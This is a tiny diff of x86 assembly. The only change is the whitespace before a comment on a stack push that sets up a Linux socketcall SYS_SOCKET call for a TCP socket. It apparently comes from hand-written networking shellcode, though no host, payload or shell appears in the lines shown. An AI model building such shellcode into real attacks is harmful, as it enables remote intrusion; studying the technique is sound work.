@@ -14,7 +14,7 @@ _start:
     inc ebx            ; SYS_SOCKET
 
     push esi                  ; protocol = 0
-    push dword 0x01           ; type = SOCK_STREAM
+    push dword 0x01                  ; type = SOCK_STREAM
     push dword 0x02           ; domain = AF_INET
 
     mov ecx, esp        ; ecx -> params 
